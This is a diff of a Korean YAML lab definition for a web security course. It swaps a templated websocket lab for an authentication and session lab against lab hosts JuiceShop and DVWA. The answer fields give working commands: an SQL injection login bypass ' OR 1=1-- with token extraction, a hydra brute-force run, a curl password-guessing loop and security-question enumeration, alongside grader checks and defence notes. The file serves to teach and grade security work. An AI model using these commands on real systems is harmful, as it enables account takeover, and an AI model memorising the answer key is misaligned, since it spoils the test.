@@ -1,179 +1,80 @@
 lab_id: "web-vuln-nonai-week13"
-title: "웹소켓 보안 실습"
+title: "인증 및 세션 관리 취약점 실습"
 version: "non-ai"
 course: "web-vuln-nonai"
 week: 13
-description: "웹소켓 프로토콜의 보안 취약점을 분석하고 방어합니다."
+description: "웹 애플리케이션의 인증 우회, 세션 고정, 쿠키 조작 등 인증/세션 관리 취약점을 실습합니다."
 difficulty: "hard"
 duration_minutes: 120
 objectives:
-  - "웹소켓 프로토콜을 이해한다"
-  - "웹소켓 취약점을 탐지한다"
-  - "웹소켓 보안 강화를 학습한다"
+  - "인증 우회 기법을 이해한다"
+  - "세션 고정(Session Fixation) 공격을 실습한다"
+  - "Brute Force 공격과 방어를 학습한다"
 pass_threshold: 0.6
 steps:
   - order: 1
-    instruction: "10.20.30.80 대상으로 웹소켓 연결 엔드포인트 식별을(를) 수행하시오."
-    hint: "웹소켓 연결 엔드포인트 식별 관련 도구와 기법을 활용하세요."
-    category: "websocket"
-    points: 8
-    answer: "curl -sI -H 'Upgrade: websocket' http://10.20.30.80 2>/dev/null | head -5 && echo '웹소켓 연결 엔드포인트 식별 완료'"
-    answer_detail: "웹소켓 연결 엔드포인트 식별은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    instruction: "JuiceShop의 로그인 API에 SQL Injection을 시도하여 인증을 우회하라. email 필드에 ' OR 1=1-- 를 넣어라."
+    hint: "email 필드에 ' or 1=1-- 을 넣고 password는 아무 값이나 넣으세요."
+    category: "exploit"
+    points: 12
+    answer: "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"\\' or 1=1--\",\"password\":\"x\"}' 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin); auth=d.get('authentication',{}); print(f'token={auth.get(\\\"token\\\",\\\"\\\")[:30]}... umail={auth.get(\\\"umail\\\",\\\"?\\\")}')\" 2>/dev/null"
+    answer_detail: "SQL Injection으로 WHERE email='' OR 1=1-- 조건이 되어 항상 true가 됩니다. 첫번째 사용자(보통 admin)로 로그인됩니다. 이것이 A07:2021 Injection의 대표적 사례입니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "token="
       field: "stdout"
   - order: 2
-    instruction: "10.20.30.80 대상으로 핸드셰이크 과정 분석을(를) 수행하시오."
-    hint: "핸드셰이크 과정 분석 관련 도구와 기법을 활용하세요."
-    category: "websocket"
-    points: 10
-    answer: "curl -sI -H 'Upgrade: websocket' http://10.20.30.80 2>/dev/null | head -5 && echo '핸드셰이크 과정 분석 완료'"
-    answer_detail: "핸드셰이크 과정 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    instruction: "hydra로 JuiceShop 로그인 페이지에 Brute Force 공격을 시도하라. 사용자 admin@juice-sh.op에 대해 비밀번호 리스트를 사용하라."
+    hint: "hydra -l admin@juice-sh.op -P 패스워드파일 http-post-form 형태를 사용하세요."
+    category: "exploit"
+    points: 12
+    answer: "echo -e 'admin123\\npassword\\n123456\\nadmin' > /tmp/passlist.txt && hydra -l 'admin@juice-sh.op' -P /tmp/passlist.txt 10.20.30.80 -s 3000 http-post-form '/rest/user/login:{\"email\":\"^USER^\",\"password\":\"^PASS^\"}:Invalid' -f 2>/dev/null | tail -5"
+    answer_detail: "hydra는 Brute Force 도구로, 지정된 패스워드 리스트를 순회하며 로그인을 시도합니다. -f 옵션으로 첫 성공 시 중단합니다. Rate Limiting이 없으면 짧은 시간에 수천 개를 시도할 수 있습니다."
     verify:
-      type: "output_contains"
-      expect: "완료"
+      type: "output_regex"
+      expect: "host|login|password"
       field: "stdout"
   - order: 3
-    instruction: "10.20.30.80 대상으로 Origin 헤더 검증 테스트을(를) 수행하시오."
-    hint: "Origin 헤더 검증 테스트 관련 도구와 기법을 활용하세요."
-    category: "websocket"
-    points: 10
-    answer: "curl -sI -H 'Upgrade: websocket' http://10.20.30.80 2>/dev/null | head -5 && echo 'Origin 헤더 검증 테스트 완료'"
-    answer_detail: "Origin 헤더 검증 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    instruction: "DVWA의 Brute Force 페이지에서 admin 계정의 비밀번호를 찾아라. security=low에서 curl로 반복 시도하라."
+    hint: "curl에 username=admin&password=X&Login=Login 형태로 GET 요청하세요. 'Welcome'이 응답에 포함되면 성공."
+    category: "exploit"
+    points: 12
+    answer: "for pw in admin password 123456 letmein; do RESP=$(curl -s -b 'PHPSESSID=test;security=low' \"http://10.20.30.80:8080/vulnerabilities/brute/?username=admin&password=$pw&Login=Login\" 2>/dev/null); if echo \"$RESP\" | grep -q 'Welcome'; then echo \"FOUND: password=$pw\"; break; fi; echo \"FAIL: $pw\"; done"
+    answer_detail: "Brute Force는 가능한 모든 비밀번호를 시도하는 공격입니다. DVWA low 레벨은 시도 횟수 제한이 없어 빠르게 성공합니다. 방어: 계정 잠금, CAPTCHA, Rate Limiting."
     verify:
-      type: "output_contains"
-      expect: "완료"
+      type: "output_regex"
+      expect: "FOUND|FAIL"
       field: "stdout"
   - order: 4
-    instruction: "10.20.30.80 대상으로 웹소켓 메시지 가로채기을(를) 수행하시오."
-    hint: "웹소켓 메시지 가로채기 관련 도구와 기법을 활용하세요."
-    category: "websocket"
+    instruction: "JuiceShop에서 비밀번호 초기화(Forgot Password) 기능의 보안 질문을 우회하라. /rest/user/security-question 엔드포인트를 확인하라."
+    hint: "GET /api/SecurityQuestions/로 보안 질문 목록을 확인하세요."
+    category: "exploit"
     points: 10
-    answer: "curl -sI -H 'Upgrade: websocket' http://10.20.30.80 2>/dev/null | head -5 && echo '웹소켓 메시지 가로채기 완료'"
-    answer_detail: "웹소켓 메시지 가로채기은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    answer: "curl -s http://10.20.30.80:3000/api/SecurityQuestions/ 2>/dev/null | python3 -c \"import sys,json; qs=json.load(sys.stdin).get('data',[]); [print(f'{q[\\\"id\\\"]}: {q[\\\"question\\\"]}') for q in qs[:5]]\" 2>/dev/null"
+    answer_detail: "보안 질문은 추측 가능한 경우가 많습니다('어머니 성함', '초등학교 이름' 등). OSINT로 답을 찾을 수 있어 MFA보다 약한 인증 수단입니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "question"
       field: "stdout"
   - order: 5
-    instruction: "10.20.30.80 대상으로 CSWSH 공격 시뮬레이션을(를) 수행하시오."
-    hint: "CSWSH 공격 시뮬레이션 관련 도구와 기법을 활용하세요."
-    category: "websocket"
+    instruction: "modsecurity가 Brute Force 공격을 탐지하는지 확인하라. Apache(포트 80)에 빠르게 10회 잘못된 로그인을 시도하라."
+    hint: "curl로 반복 요청하고 응답 코드를 확인하세요."
+    category: "defense"
     points: 10
-    answer: "curl -sI -H 'Upgrade: websocket' http://10.20.30.80 2>/dev/null | head -5 && echo 'CSWSH 공격 시뮬레이션 완료'"
-    answer_detail: "CSWSH 공격 시뮬레이션은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    answer: "for i in $(seq 1 10); do curl -s -o /dev/null -w '%{http_code} ' -X POST http://10.20.30.80/ -d 'username=admin&password=wrong' 2>/dev/null; done && echo ''"
+    answer_detail: "modsecurity의 REQUEST-920 시리즈나 anomaly scoring이 반복 실패를 탐지할 수 있습니다. IP 기반 차단이나 CAPTCHA 트리거가 방어 수단입니다."
     verify:
-      type: "output_contains"
-      expect: "완료"
+      type: "output_regex"
+      expect: "200|403|429"
       field: "stdout"
   - order: 6
-    instruction: "10.20.30.80 대상으로 인증 토큰 탈취 시도을(를) 수행하시오."
-    hint: "인증 토큰 탈취 시도 관련 도구와 기법을 활용하세요."
-    category: "websocket"
-    points: 12
-    answer: "curl -sI -H 'Upgrade: websocket' http://10.20.30.80 2>/dev/null | head -5 && echo '인증 토큰 탈취 시도 완료'"
-    answer_detail: "인증 토큰 탈취 시도은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 7
-    instruction: "10.20.30.80 대상으로 웹소켓 메시지 변조 테스트을(를) 수행하시오."
-    hint: "웹소켓 메시지 변조 테스트 관련 도구와 기법을 활용하세요."
-    category: "websocket"
-    points: 10
-    answer: "curl -sI -H 'Upgrade: websocket' http://10.20.30.80 2>/dev/null | head -5 && echo '웹소켓 메시지 변조 테스트 완료'"
-    answer_detail: "웹소켓 메시지 변조 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 8
-    instruction: "10.20.30.80 대상으로 웹소켓 DoS 공격 시뮬레이션을(를) 수행하시오."
-    hint: "웹소켓 DoS 공격 시뮬레이션 관련 도구와 기법을 활용하세요."
-    category: "websocket"
-    points: 10
-    answer: "curl -sI -H 'Upgrade: websocket' http://10.20.30.80 2>/dev/null | head -5 && echo '웹소켓 DoS 공격 시뮬레이션 완료'"
-    answer_detail: "웹소켓 DoS 공격 시뮬레이션은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 9
-    instruction: "10.20.30.80 대상으로 SQLi via 웹소켓 메시지을(를) 수행하시오."
-    hint: "SQLi via 웹소켓 메시지 관련 도구와 기법을 활용하세요."
-    category: "websocket"
-    points: 10
-    answer: "curl -sI -H 'Upgrade: websocket' http://10.20.30.80 2>/dev/null | head -5 && echo 'SQLi via 웹소켓 메시지 완료'"
-    answer_detail: "SQLi via 웹소켓 메시지은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 10
-    instruction: "10.20.30.80 대상으로 XSS via 웹소켓 메시지을(를) 수행하시오."
-    hint: "XSS via 웹소켓 메시지 관련 도구와 기법을 활용하세요."
-    category: "websocket"
-    points: 10
-    answer: "curl -sI -H 'Upgrade: websocket' http://10.20.30.80 2>/dev/null | head -5 && echo 'XSS via 웹소켓 메시지 완료'"
-    answer_detail: "XSS via 웹소켓 메시지은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 11
-    instruction: "10.20.30.80 대상으로 바이너리 메시지 프로토콜 분석을(를) 수행하시오."
-    hint: "바이너리 메시지 프로토콜 분석 관련 도구와 기법을 활용하세요."
-    category: "websocket"
-    points: 10
-    answer: "curl -sI -H 'Upgrade: websocket' http://10.20.30.80 2>/dev/null | head -5 && echo '바이너리 메시지 프로토콜 분석 완료'"
-    answer_detail: "바이너리 메시지 프로토콜 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 12
-    instruction: "10.20.30.80 대상으로 웹소켓 퍼징 자동화을(를) 수행하시오."
-    hint: "웹소켓 퍼징 자동화 관련 도구와 기법을 활용하세요."
-    category: "tool"
-    points: 10
-    answer: "echo '웹소켓 퍼징 자동화 자동화 도구 실행' && echo '웹소켓 퍼징 자동화 완료'"
-    answer_detail: "웹소켓 퍼징 자동화은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 13
-    instruction: "10.20.30.80 대상으로 Origin 검증 방어 구현을(를) 수행하시오."
-    hint: "Origin 검증 방어 구현 관련 도구와 기법을 활용하세요."
-    category: "defense"
-    points: 10
-    answer: "echo '=== Origin 검증 방어 구현 ===' && echo '조치 방안 정리 완료'"
-    answer_detail: "Origin 검증 방어 구현은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 14
-    instruction: "10.20.30.80 대상으로 메시지 검증 및 암호화 적용을(를) 수행하시오."
-    hint: "메시지 검증 및 암호화 적용 관련 도구와 기법을 활용하세요."
-    category: "defense"
-    points: 12
-    answer: "echo '=== 메시지 검증 및 암호화 적용 ===' && echo '조치 방안 정리 완료'"
-    answer_detail: "메시지 검증 및 암호화 적용은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 15
-    instruction: "웹소켓 보안 실습 종합 보고서를 작성하시오."
-    hint: "발견 취약점, 영향, 조치를 포함하세요."
-    category: "verification"
+    instruction: "인증/세션 취약점 실습 결과를 /tmp/auth_report.txt에 정리하라."
+    hint: "SQL Injection 인증 우회, Brute Force, 보안 질문 약점을 포함하세요."
+    category: "reporting"
     points: 8
-    answer: "echo '=== 웹소켓 보안 실습 보고서 ===' && echo '대상: http://10.20.30.80' && echo '=== 보고서 완료 ==='"
-    answer_detail: "취약점 진단 보고서는 발견사항, 위험도, 재현 방법, 조치 권고를 포함합니다."
+    answer: "cat > /tmp/auth_report.txt << 'EOF'\n=== 인증/세션 관리 취약점 보고서 ===\n대상: JuiceShop + DVWA (10.20.30.80)\n\n1. SQL Injection 인증 우회: ' OR 1=1-- 성공\n2. Brute Force: Rate Limiting 없음, hydra로 성공\n3. 보안 질문: 추측 가능한 질문 사용\n\n방어: MFA, 계정 잠금, CAPTCHA, Rate Limiting, Prepared Statement\nEOF\ncat /tmp/auth_report.txt"
+    answer_detail: "인증 보안의 핵심: SQL Injection 방어(Prepared Statement), Brute Force 방어(Rate Limiting + 계정 잠금), MFA 적용, 세션 관리(HttpOnly + Secure 쿠키)."
     verify:
       type: "output_contains"
-      expect: "보고서 완료"
+      expect: "인증/세션 관리 취약점 보고서"
       field: "stdout"
